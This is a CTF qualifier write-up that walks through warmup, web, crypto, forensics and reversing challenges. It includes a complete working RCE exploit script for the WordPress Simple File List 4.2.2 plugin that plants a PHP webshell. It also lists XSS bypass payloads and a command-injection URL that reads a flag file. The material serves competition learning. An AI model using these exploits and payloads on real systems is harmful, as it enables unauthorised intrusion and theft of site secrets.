# Writeup for ECOWAS CTF QUALS

# netcat
## Category: warmup

![challenge](https://i.imgur.com/C283mwf.png)

> Let's establish a connection so I can address you a simple question.

> nc 0.cloud.chals.io 27931

on connecting to it via netcat

```
┌──(gr33pp㉿machine)
└─$ nc 0.cloud.chals.io 27931
Would you like the flag?
yes
flag{n3tc4t_d03s_n0t_g0_m30w}

```
I got this first try, the answer was "yes", then it gave me the flag

flag: `flag{n3tc4t_d03s_n0t_g0_m30w}`

# Strings
## Category: warmup

![challenge](https://i.imgur.com/giS5dzV.png)

>The flag is concealed within the file in the form of a string. Can you assist in uncovering its whereabouts?

There a binary executable file from the challenge. On following the challenge instructions, I ran this and grep the flag.

```
┌──(gr33pp㉿machine)
└─$ strings strings | grep flag
flag{th4t5_4_l0t_0f_5tr1ng5}

```

flag: `flag{th4t5_4_l0t_0f_5tr1ng5}`

## SoppazShoes
### Category: Web 

![Image](https://i.imgur.com/eORsTXq.png)

> I'm a huge sneakerhead but I'm not so good at programming. My friend tells me he can buy my new pre-release shoe, the All-Star Flags. Can you try and buy them so I can figure out how he's doing it?

![Image](https://i.imgur.com/36PgV4V.png)

I went through the site first (I didn't bother to check the python source code) and I discovered I could get the products by changing the item number..

![Imgur](https://i.imgur.com/ecQfcFj.png)

This is an IDOR (Insecure Direct Object Reference) vulnerability.

Next, I wrote a bash script to go through each of the items and find in page which one has "All-Star Flags" 

```bash
#!/bin/bash

main_url="https://ctftogo-soppazshoes.chals.io/items/"
shoe="All-Star Flags"

for number in {1..100}; do 
    url="${main_url}${number}"
    response=$(curl -s "$url") 

    if echo "$response" | grep -q "$shoe"; then
        echo "Found '$shoe' in $url"
    else
        echo "'$shoe' not found in $url"
    fi
done

```
Result
```
┌──(gr33pp㉿machine)-[~/ecowas-ctf]
└─$ bash soppazshoes.sh 
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/1
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/2
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/3
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/4
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/5
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/6
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/7
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/8
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/9
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/10
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/11
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/12
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/13
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/14
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/15
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/16
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/17
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/18
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/19
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/20
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/21
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/22
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/23
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/24
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/25
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/26
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/27
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/28
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/29
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/30
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/31
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/32
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/33
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/34
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/35
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/36
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/37
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/38
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/39
Found 'All-Star Flags' in https://ctftogo-soppazshoes.chals.io/items/40
Found 'All-Star Flags' in https://ctftogo-soppazshoes.chals.io/items/41
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/42
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/43
Found 'All-Star Flags' in https://ctftogo-soppazshoes.chals.io/items/44
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/45
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/46
Found 'All-Star Flags' in https://ctftogo-soppazshoes.chals.io/items/47
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/48
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/49
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/50
'All-Star Flags' not found in https://ctftogo-soppazshoes.chals.io/items/51

[snip]
```
There is same item on 40, 41, 44 and 47... On doing checkout, flag showed when I checkedout one of them

![Imgur](https://i.imgur.com/DZSv3gE.png)

Flag: `flag{n0w_g3t_s0m3_r34l_y33zys}`

## Chevrolet Traverse
### Category: Web

![Image](https://i.imgur.com/ycmzn2D.png)

> Exploring My Car Collection: While Ascending a Level Uncovers My Hidden Secrets.

![Image](https://i.imgur.com/JK6gGDO.png)

With the tip and challenge name, I guessed correctly that the web app is vulnerable to path traversal

![path](https://i.imgur.com/VbQBufL.png)

It even alerts the directory and files. Next, I went into secrets folder and found flag.txt. Right in the page source, we have the content of flag.txt

![flag](https://i.imgur.com/btYWyEY.png)

Decoding with cyberchef:

![flag](https://i.imgur.com/yIeoAvj.png)

Flag: `flag{vr00m_vr00m_now_y0u_r_z00m1ng}`


# IZIrsa
## Category: Cryptography

![image](https://i.imgur.com/MrEoxBb.png)

```
c = 253531916432322298053250937193688715804675877467421863721500099250994106573287490406946422261539808641643579360867972587480442118769784193102040867769698847348444487381478224610267159208895311306363039022363007025402831809706871344008605633536701876907909395530746273077680104860539268870737996595986255451860526076417328003406583877583122138052686641536049736650895970946946035823502502768574935902696678047030376591729571293315520443583996286045618057879759381

n = 1209143407476550975641959824312993703149920344437422193042293131572745298662696284279928622412441255652391493241414170537319784298367821654726781089600780498369402167443363862621886943970468819656731959468058528787895569936536904387979815183897568006750131879851263753496120098205966442010445601534305483783759226510120860633770814540166419495817666312474484061885435295870436055727722073738662516644186716532891328742452198364825809508602208516407566578212780807

e = 65537
```

This is straight up RSA encryption so used dcode.fr to decrypt it

![decode](https://i.imgur.com/rPDemhD.png)

flag: `EcowasCTF{i_h4ve_an_RSA_fetish_;)}`


# Ron Adi Leonard 
## Category: Cryptography

![image](https://i.imgur.com/Qy3k9A9.png)

There are two files here, flag.enc and public.pem. The flag needs to be decrypted by providing the private key. Here we have only the public key. Next I tried to generate a private key from the public.pem file using RsaCtfTool

```             
┌──(gr33pp㉿machine)
└─$ ./RsaCtfTool.py --publickey public.pem --private
['public.pem']

[*] Testing key public.pem.
attack initialized...
attack initialized...
[*] Performing nonRSA attack on public.pem.
[+] Time elapsed: 0.0304 sec.
[*] Performing pastctfprimes attack on public.pem.
[+] loading prime list file data/visa_emv.txt...
100%|███████████████████████████████████████████| 2/2 [00:00<00:00, 37957.50it/s]
[+] loading prime list file data/pastctfprimes.txt...
100%|██████████████████████████████████████| 121/121 [00:00<00:00, 444016.43it/s]
[+] loading prime list file data/ti_rsa_signing_keys.txt...
100%|████████████████████████████████████████| 34/34 [00:00<00:00, 408614.14it/s]
[+] Time elapsed: 0.1029 sec.
[*] Performing factordb attack on public.pem.
[*] Attack success with factordb method !
[+] Total time elapsed min,max,avg: 0.0304/0.1029/0.0666 sec.

Results for public.pem:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIIDfAIBAAKBwQCAbGlBQvlKimWI6NBLDpB/QIpdbveg1aWtSLv7v+N1eiNUvlb6
mo4tiGpYQZYwvCRfqtG9116vV3oB+H6I6L5AAPtfgOsUJs5Yejmsn+p2o4YJN50C
3M+u5iTe6uvgElsXruUdV9mVH7aa//lXi9/zH8/YcYY/9woGpZsOOKzQ0NxSkJAd
Kd+q+5rD2U3LCISBPkiiKzHuH8ldCAeueXrpShS1r3zF8MbIPzBLMGlYmZkDxQBm
imCZ4N1obj5BuwcCAwEAAQKBwHtJmHJynWiWHIunFfA4dzfy+eJg2ZGqCXelz/IL
cY4iRzDf2hiTr9K+l3lK3ajDthexodGipN+oFxU1PiSpa5t+VdSFqyiZaJdAH4Y9
r5VdvxuyLCXHXgoGH3dyCCgA9d5O6vaeHN3Hb5o0F2kOZX0BY+NEOluhDKkU1P3q
Q1+xp343lpUO6m4V/Fzi5i/hlETXJw8Z+Y6tXjR5qeAT9hlaKBjZ3BgsK4WFsti3
j/E0dniv4kmPZ483uhNKz+wPQQJhALVRi4NPGQVGmu3bSkujJJp7YWlATXwUXzdv
YwfNzgewC3+YFmxJMOCsBStvWweuA4NP+BVAvjPWbiRqudkY2x2Jau213S0QkP35
jq15p6zkqvPmMHZ8PzpnFFXWy69xGQJhALVRi4NPGQVGmu3bSkujJJp7YWlATXwU
XzdvYwfNzgewC3+YFmxJMOCsBStvWweuA4NP+BVAvjPWbiRqudkY2x2Jau213S0Q
kP35jq15p6zkqvPmMHZ8PzpnFFXWy69xHwJgVkc8PLpZrJIBTOeJPd6en0fQfXXU
qRNEj6tYEzGSNURG5GspWFOnh3EzcIynY0shbs2RvgM1vpLtjDSgxLY4JaDrGbvt
R/FXHRMwGkoGSJXy5uYE74yFxbOhEIuKFqyZAmEAgcloAsrYjxU2CvJAIRobNlUA
qjU0AZAXg/fAPDLNumUCJgf4bPSK/xdC8A9aaondy92vJ49bVoGz/29BrquDFIZr
utHGCt7j2lgLEBOXuUNJNyJbKETRgX2NadBBpkhjAmAeOEHrN9mA4RnSTzcMmzDE
aeWRireUrg/ekpCBTPer8qyVRAO8tt16x1Yx5+SBR6tAjVQDispd+RJbZx75hCSE
7Dx886Tc2BgqVEJyPvFHe3HTUQgTv1/fES4OTndH6C8=
-----END RSA PRIVATE KEY-----

```

I copied the result and saved it as privatekey then I used openssl to decrypt the flag.enc file

```
$ openssl pkeyutl -decrypt -inkey privatekey -in flag.enc -out decrypted_file
$ cat decrypted_flag
EcoWAS{Let_me_try_RSA}
```

flag: `EcoWAS{Let_me_try_RSA}`

# sakpatè
## Category: Cryptography

![imageofchallenge](https://i.imgur.com/HpvNyRz.png)

> eXclusive ^. Check it out!

```
IConIT0+KTQZNjMyNRkyLiMZIDMoGS8oGSAzKCInKyMoMicqOw==
```

The tip says exclusive ^ . What came to my mind was exclusive OR gate. The flag was encoded in base 64, so I decrypted that and ran XOR bruteforce since the key is unknown

![flagg](https://i.imgur.com/rjlKCR7.png)

Bruteforce success, key: 46

flag: `flag{xor_puts_the_fun_in_fundamental}`

## xss101
### Category: Web

![Image](https://i.imgur.com/RfDEIZ8.png)

> Welcome to XSS School. Just going to do a review of the basics today.

![Image](https://i.imgur.com/kg4PiUF.png)

The challenge says we get the flag by calling the Javascript alert() function as alert('win')

![image](https://i.imgur.com/3NjxsXr.png)

Very basic XSS worked on it

Payload `<script>alert('win')</script>`

![image](https://i.imgur.com/Z6xwHgX.png)

Then I got a link to the next level

![next](https://i.imgur.com/iHtFjJr.png)

Level 2 Payload: `"><script>alert('win')</script>`

Level 3 Payload: `"autofocus onfocus="alert('win')`

Level 4 Payload: `'; alert('win')//`

Level 4 payload required close look to the page source (most importantly, my teammates help get level 4)

Finally, I graduated XSS101!!

![imageflag](https://i.imgur.com/Zqpyd7C.png)

Flag: `flag{congrats_you_now_have_a_degree_in_xss}`

# A Peculiar Email
## Category: Forensics

![image](https://i.imgur.com/gT46xXX.png)

There is a file attached, called spam_email

```
Dear Professional ; Especially for you - this cutting-edge 
intelligence ! If you no longer wish to receive our 
publications simply reply with a Subject: of "REMOVE" 
and you will immediately be removed from our club . 
This mail is being sent in compliance with Senate bill 
2216 ; Title 9 ; Section 303 ! This is not multi-level 
marketing ! Why work for somebody else when you can 
become rich as few as 90 months ! Have you ever noticed 
people are much more likely to BUY with a credit card 
than cash and people will do almost anything to avoid 
mailing their bills . Well, now is your chance to capitalize 
on this ! We will help you sell more and process your 
orders within seconds ! You can begin at absolutely 
no cost to you . But don't believe us . Prof Anderson 
of Alaska tried us and says "My only problem now is 
where to park all my cars" ! We assure you that we 
operate within all applicable laws . If not for you 
then for your LOVED ONES - act now . Sign up a friend 
and you'll get a discount of 50% ! Thank-you for your 
serious consideration of our offer ! Dear Friend ; 
Especially for you - this amazing announcement . If 
you are not interested in our publications and wish 
to be removed from our lists, simply do NOT respond 
and ignore this mail ! This mail is being sent in compliance 
with Senate bill 1619 , Title 5 ; Section 306 . THIS 
IS NOT MULTI-LEVEL MARKETING ! Why work for somebody 
else when you can become rich in 60 DAYS ! Have you 
ever noticed nobody is getting any younger plus most 
everyone has a cellphone . Well, now is your chance 
to capitalize on this ! We will help you turn your 
business into an E-BUSINESS and turn your business 
into an E-BUSINESS . You can begin at absolutely no 
cost to you . But don't believe us ! Mr Anderson who 
resides in Indiana tried us and says "I was skeptical 
but it worked for me" . We are a BBB member in good 
standing ! You have no reason not to act now . Sign 
up a friend and you'll get a discount of 80% . Thank-you 
for your serious consideration of our offer . Dear 
E-Commerce professional , We know you are interested 
in receiving hot announcement . This is a one time 
mailing there is no need to request removal if you 
won't want any more ! This mail is being sent in compliance 
with Senate bill 1626 ; Title 3 , Section 303 . Do 
NOT confuse us with Internet scam artists ! Why work 
for somebody else when you can become rich in 51 weeks 
! Have you ever noticed people love convenience & nearly 
every commercial on television has a .com on in it 
. Well, now is your chance to capitalize on this . 
WE will help YOU use credit cards on your website and 
use credit cards on your website . The best thing about 
our system is that it is absolutely risk free for you 
! But don't believe us . Prof Ames who resides in Alabama 
tried us and says "I was skeptical but it worked for 
me" ! We assure you that we operate within all applicable 
laws ! Do not go to sleep without ordering . Sign up 
a friend and you'll get a discount of 30% ! Thanks 
. Dear Internet user , Your email address has been 
submitted to us indicating your interest in our newsletter 
. If you no longer wish to receive our publications 
simply reply with a Subject: of "REMOVE" and you will 
immediately be removed from our mailing list ! This 
mail is being sent in compliance with Senate bill 1916 
, Title 6 ; Section 309 . This is a ligitimate business 
proposal ! Why work for somebody else when you can 
become rich in 92 days ! Have you ever noticed the 
baby boomers are more demanding than their parents 
plus nobody is getting any younger ! Well, now is your 
chance to capitalize on this ! WE will help YOU use 
credit cards on your website and increase customer 
response by 150% . You are guaranteed to succeed because 
we take all the risk ! But don't believe us . Mr Jones 
who resides in North Carolina tried us and says "Now 
I'm rich many more things are possible" ! We are a 
BBB member in good standing ! Because the Internet 
operates on "Internet time" you must hurry . Sign up 
a friend and you'll get a discount of 20% ! God Bless 
! Dear Decision maker , This letter was specially selected 
to be sent to you ! This is a one time mailing there 
is no need to request removal if you won't want any 
more . This mail is being sent in compliance with Senate 
bill 2516 ; Title 6 , Section 303 ! THIS IS NOT MULTI-LEVEL 
MARKETING ! Why work for somebody else when you can 
become rich in 17 weeks . Have you ever noticed most 
everyone has a cellphone and more people than ever 
are surfing the web . Well, now is your chance to capitalize 
on this ! We will help you process your orders within 
seconds and process your orders within seconds ! You 
are guaranteed to succeed because we take all the risk 
. But don't believe us . Mrs Simpson of Wyoming tried 
us and says "My only problem now is where to park all 
my cars" . We assure you that we operate within all 
applicable laws . If not for you then for your LOVED 
ONES - act now . Sign up a friend and you'll get a 
discount of 10% ! Thanks . Dear Professional ; This 
letter was specially selected to be sent to you . We 
will comply with all removal requests ! This mail is 
being sent in compliance with Senate bill 2516 ; Title 
3 ; Section 305 ! THIS IS NOT MULTI-LEVEL MARKETING 
! Why work for somebody else when you can become rich 
in 10 months ! Have you ever noticed most everyone 
has a cellphone & society seems to be moving faster 
and faster ! Well, now is your chance to capitalize 
on this ! We will help you SELL MORE and process your 
orders within seconds ! The best thing about our system 
is that it is absolutely risk free for you . But don't 
believe us . Mrs Anderson of Massachusetts tried us 
and says "Now I'm rich, Rich, RICH" ! We are a BBB 
member in good standing ! We implore you - act now 
! Sign up a friend and you'll get a discount of 90% 
. Thanks . 

```
This looks fishy lol. I googled the whole thing and found the tool that generates the spam cipher. It was called spammimic

![picturespam](https://i.imgur.com/hpnYTZE.png)

flag: `flag{Why do you have an affinity for concealed matters? Proceed and confess!}`


## Sentinnelle
### Category: Forensics

![challenge](https://i.imgur.com/g6Yermn.png)

> La nuit est longue, mais le jour vient.

It took long for the team to find this but here is the summary... I checked the hexdump of the photo and found some strings that is similar to how steghide store information. Next I cracked the steghide password using stegseek with rockyou wordlist and got an audio file as result, with the password.


```

┌──(gr33pp㉿machine)-[~/ecowas-ctf]
└─$ stegseek olympio.jpg /usr/share/wordlists/rockyou.txt           
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "!20DeSi02!"        

[i] Original filename: "ctf.wav".
[i] Extracting to "olympio.jpg.out".

```

The audio sounded like long and short beeps which is similar to morse code. Next I decoded the beeps.

![fakeflag](https://i.imgur.com/Jc9lVn4.png)

Fake flag!!.

Hexdump shows something suspicious at the end of the audio..  `t4@(2Dr%uL7#=bgy(%Hwx?>a@p@'s}@>2#6@'AN` which is a ROT47 cipher

![cybercheff](https://i.imgur.com/Ccw0dAt.png)

Flag: `EcoWasCTF{fRl38JWTwHInm2oAoVDNomaReoVp}`


# ezxss
## Category: web

![Imgur](https://i.imgur.com/JimbBzj.png)

Really easy XSS 

url = `https://ctftogo-ezxss.chals.io/?q=%3Cscript%3Ealert%28%27win%27%29%3C%2Fscript%3E`

I got the url by injecting `<script>alert('win')</script>` into the searchbox

![Imgur](https://i.imgur.com/VccI9Ix.png)

flag: `flag{we_can_call_this_xss_level_0}`


# kashe kanka
## Category: Cryptography

![imagw](https://i.imgur.com/09ijYSg.png)

>The flag is formatted normally with the flag{...} format. Use this to your advantage when cracking the 7 character key and decrypting the flag. IAUPA1sVCjQ2HhFUHjoyAQs7UBgLGQAAO1AYCxkLDxdFCTogBQ8DXQ==

Since it is known that the key length is 7 characters and the result is in flag{....}, it gives a better look into decrypting this.

``` python
import base64
base64_cypher = 'IAUPA1sVCjQ2HhFUHjoyAQs7UBgLGQAAO1AYCxkLDxdFCTogBQ8DXQ=='
plaintext = b'flag{'
cypher = base64.b64decode(base64_cypher)
key = ''.join(chr(c ^ m) for c, m in zip(cypher, plaintext))
print("(" + key + ")")

```

``` 
The result
$ python try.py
(Find )
```

I got "Find " with a space at the front. That means I was able to recover 5 characters of the key. Using cyber chef to try the XOR key gives a close decryption of `flag{ScZR>W=p^GbU48Mpndqe}+I~+mflag}`. I guessed the 2 remaining characters lol. It was "me", the XOR key is "Find me". 

flag: `flag{xor_puts_the_pun_in_pun_based_flag}`


# fairytale
## Category: Forensics

![Imgur](https://i.imgur.com/TwyQd5I.png)

A fix to the file magic does the job. The file attached was a zip file with broken "magic", the header was edited to serve as a pdf. So I changed the file header from the pdf to zip. Using hexedit, I changed the first 4 hex to `50 4B 03 04`  then extracted the zip which contains image with hex characters.

![cuteflag](https://i.imgur.com/LMr8pvQm.png)

`45 63 6f 57 61 73 43 54 46 7b 6f 4e 65 5f 43 75 54 65 5f 43 61 54 21 7d` which decodes to the flag

flag: `EcoWasCTF{oNe_CuTe_CaT!}`

# n'tifafa 
## Category: reversing

There is a jar file attached that needs to be "reverse engineered". I used an online decompiler to understand the script and then generate the required key to qualify as the flag. This is the decompiler output `jambles.java`

``` java
import java.util.Scanner;

public class Jambles
{
    public static int doThing(final String s) {
        int n = 0;
        for (int i = 0; i < s.length(); ++i) {
            if (Character.isDigit(s.charAt(i))) {
                ++n;
            }
        }
        return n;
    }
    
    public static String doOtherThing(final String s) {
        return s.substring(0, 5);
    }
    
    public static String jambles(final String s) {
        final String s2 = "bad";
        final String s3 = new String("doggo");
        if (s.length() % 2 != 0) {
            return s2;
        }
        if (!s.equals(s.toLowerCase())) {
            return s2;
        }
        if (s.length() < 12 || s.length() > 20) {
            return s2;
        }
        if (doThing(s) != 3) {
            return s2;
        }
        if (s.charAt(s.length() - 1) != 'q') {
            return s2;
        }
        if (doOtherThing(s) == s3) {
            return s2;
        }
        return "goood stuff";
    }
    
    public static void check(final String str, final String s) {
        if (s == "bad") {
            System.out.println("Oh no, not good...");
        }
        else if (s == "goood stuff") {
            System.out.println("Good job, submit: " + str);
        }
    }
    
    public static void main(final String[] array) {
        final Scanner scanner = new Scanner(System.in);
        System.out.print("                        (\n                          )     (\n                   ___...(-------)-....___\n               .-\"\"       )    (          \"\"-.\n         .-'``'|-._             )         _.-|\n        /  .--.|   `\"\"---...........---\"\"`   |\n       /  /    |                             |\n       |  |    |                             |\n        \\  \\   |                             |\n         `\\ `\\ |                             |\n           `\\ `|                             |\n           _/ /\\                             /\n          (__/  \\                           /\n       _..---\"\"` \\                         /`\"\"---.._\n    .-'           \\                       /          '-.\n   :               `-.__             __.-'              :\n   :                  ) \"\"---...---\"\" (                 :\n    '._               `\"--...___...--\"`              _.'\n  jgs \\\"\"--..__                              __..--\"\"/\n       '._     \"\"\"----.....______.....----\"\"\"     _.'\n          `\"\"--..,,_____            _____,,..--\"\"`\n                        `\"\"\"----\"\"\"`\n\n");
        System.out.println("Can you get past the jambles, Enter your key");
        final String next = scanner.next();
        check(next, jambles(next));
    }
}
```

from the conditions, we can see that the input must:

1. be even in number
2. be in lowercase
3. be between 12 and 20 charaters
4. contain 3 numbers
5. have letter "q" as last character
6. not have "doggo" as the first 5 character

I wrote a python script to generate strings in this rule and I tested by running the jar file.

``` python
import random
import string

def generate_string():
    while True:
        length = random.randint(12, 20)
        if length % 2 != 0:
            continue
        
        numbers = [random.choice(string.digits) for _ in range(3)]
        letters = [random.choice(string.ascii_lowercase) for _ in range(length - 3)]
        
        candidate = ''.join(letters) + ''.join(numbers) + "q"
        
        return candidate

generated_string = generate_string()
print(generated_string)
```

flag varies in this challenge

# Ezodédé
## Category: web

I found out that the website runs ping command directly on the sever, so nesting command for it to run might work if the input is not sanitised. RCE (Remote Code Execution) vulnerability here. This can be done by `; command_here`. I was able to run `ls` and then print the flag with `; cat flag.txt`.

url to get flag: `https://ctftogo-networktools.chals.io/ping?ip=%3B+cat+flag.txt`

![Imgur](https://i.imgur.com/mbnxsM1.png)

flag: `flag{tp_link_d_link_theyre_all_the_same}`

# Cool catché 
## Category: Networking

I ran strings without opening the pcap in the attached zip file

```
$ strings coolcatch | grep flag
```

flag: `flag{hello-hello-follow-me-okay}`

# Gweta
## Category: web

![image](https://i.imgur.com/dtlsyO4.png)

Looking at the source, I found a javascript file `users.js` and I used it to solve the challenge.. The flag is stored, we just have to echo it out..

```javascript
alert("PREMIUM: flag{" + ([]+{})[2] + (typeof null)[0] + (typeof NaN)[(typeof NaN).length - 1] + (typeof NaN[(typeof NaN).length - 1])[1] + ("" + (!+[]+[]+![]).length - 7) + ("" + (" " == 0)) +"}");

```

Using the console, input that and get the flag

![image](https://i.imgur.com/Kbvz812.png)

flag: `flag{born2true}`


# Ayabavi
## Category: web

![image](https://i.imgur.com/LfGcthJ.png)

The website was built with WordPress version 5.5.12 (Wappalyzer showed that :)) and its running a simple file list plugin version 4.2.2 (I checked that manually). This plugin is known to have a RCE (Remote Code Execution) vulnerability..

![sitescreenshot](https://i.imgur.com/UyqkEtB.png)

Next I exploited the vulnerability with a modified exploit script I found on Github, which was written in python.


```python

# Exploit Title: Wordpress Plugin Simple File List 4.2.2 - Remote Code Execution
# Date: 2020-04-19
# Original Exploit Author: coiffeur
# Modified Exploit Author: hermh4cks
# Vendor Homepage: https://simplefilelist.com/
# Software Link: https://wordpress.org/plugins/simple-file-list/
# Version: Wordpress Simple File List <= v4.2.2

import requests
import random
import hashlib
import sys
import os
import urllib3
urllib3.disable_warnings()

dir_path = '/wp-content/uploads/simple-file-list/'
upload_path = '/wp-content/plugins/simple-file-list/ee-upload-engine.php'
move_path = '/wp-content/plugins/simple-file-list/ee-file-engine.php'
password = 0

def usage():
    banner = """
NAME: Wordpress v5.4 Simple File List v4.2.2, pre-auth RCE
SYNOPSIS: python wp_simple_file_list_4.2.2.py <URL>
AUTHOR: coiffeur
Edited By:HermH4cks
Note: This is an update to the original exploit by coiffeur to use a GET command without the POST and password options
    """
    print(banner)


def generate():
    filename = f'{random.randint(0, 10000)}.png'
    with open(f'{filename}', 'wb') as f:
        payload = "<?php system($_GET['cmd']);?>"
        f.write(payload.encode())
    print(f'[ ] File {filename}')
    return filename


def upload(url, filename):
    files = {'file': (filename, open(filename, 'rb'), 'image/png')}
    datas = {'eeSFL_ID': 1, 'eeSFL_FileUploadDir': dir_path,
             'eeSFL_Timestamp': 1587258885, 'eeSFL_Token': 'ba288252629a5399759b6fde1e205bc2'}
    r = requests.post(url=f'{url}{upload_path}',
                      data=datas, files=files, verify=False)
    r = requests.get(url=f'{url}{dir_path}{filename}', verify=False)
    if r.status_code == 200:
        print(f'[ ] File uploaded at {url}{dir_path}{filename}')
        os.remove(filename)
    else:
        print(f'[*] Failed to upload {filename}')
        exit(-1)
    return filename


def move(url, filename):
    new_filename = f'{filename.split(".")[0]}.php'
    headers = {'Referer': f'{url}/wp-admin/admin.php?page=ee-simple-file-list&tab=file_list&eeListID=1',
               'X-Requested-With': 'XMLHttpRequest'}
    datas = {'eeSFL_ID': 1, 'eeFileOld': filename,
             'eeListFolder': '/', 'eeFileAction': f'Rename|{new_filename}'}
    r = requests.post(url=f'{url}{move_path}',
                      data=datas, headers=headers, verify=False)
    if r.status_code == 200:
        print(f'[ ] File moved to {url}{dir_path}{new_filename}')
    else:
        print(f'[*] Failed to move {filename}')
        exit(-1)
    return new_filename


def main(url):
    file_to_upload = generate()
    uploaded_file = upload(url, file_to_upload)
    moved_file = move(url, uploaded_file)
    if moved_file:
        print(f'[+] Exploit seem to work.\n[+] GET request for RCE via php webshell: {url}{dir_path}{moved_file}?cmd=<command to run on target>')

if __name__ == "__main__":
    if (len(sys.argv) < 2):
        usage()
        exit(-1)

    main(sys.argv[1])

```

I ran the python script and got a reverse shell..

```

┌──(gr33pp㉿machine)
└─$ python gate.py https://ctftogo-bf7890dd3685-my-stuff-1.chals.io 
[ ] File 9672.png
[ ] File uploaded at https://ctftogo-bf7890dd3685-my-stuff-1.chals.io/wp-content/uploads/simple-file-list/9672.png
[ ] File moved to https://ctftogo-bf7890dd3685-my-stuff-1.chals.io/wp-content/uploads/simple-file-list/9672.php
[+] Exploit seem to work.
[+] GET request for RCE via php webshell: https://ctftogo-bf7890dd3685-my-stuff-1.chals.io/wp-content/uploads/simple-file-list/9672.php?cmd=<command to run on target>

```

I navigated around the files and found the flag in `wp-config.php` file

![image](https://i.imgur.com/0HkUSfY.png)

payload: `https://ctftogo-bf7890dd3685-my-stuff-1.chals.io/wp-content/uploads/simple-file-list/9672.php?cmd=cd%20../../../%20;%20cat%20wp-config.php`

flag: `flag{add_action(wordpress_plugins_strike_again!)}`

# OBADA
## Category: warmup

![image](https://i.imgur.com/Kk488zB.png)

Unzipping the attached zip gives a folder named grep2 which contains 9 folders and each folder containing 24 text files each. All of them contains random strings and I'm sure the flag is in one of these random data.

Using `find . -name "file_* -exec grep "flag" {} \;` , I was able to get the flag once

flag: `flag{9r3p_s4v3s_y0u_t1m3}`

# Zangbeto
## Category: Forensics

![Imgur](https://i.imgur.com/rllStYE.png)                       

I used binwalk on the zip file and I got a zip and some folders, extracting the zip gave some folders and an image containing the flag string in it

![Imgur](https://i.imgur.com/Zlh6mj4.jpg)

flag: `flag{old_macdonald_or_mcdonalds_supplier?}`

# Assini
## Category: Forensics

![Imgur](https://i.imgur.com/585HApg.png)

>I seem to have come across a bit of a puzzle – this file is locked with encryption. I'm unable to access its contents. Can you give it a shot?

On running file command I detected its a pdf file. The pdf seem to be encrypted with a password. John with rockyou wordlist did the job of getting password.

password: `hacked`

![Imgur](https://i.imgur.com/bNGwhFT.png)

flag: `flag{kramer_the_best_hacker_ever}`


# Rue Princesse
## Category: web

On checking the headers, we can find the flag.

flag:`flag{who_run_the_world?_http_headers.}`

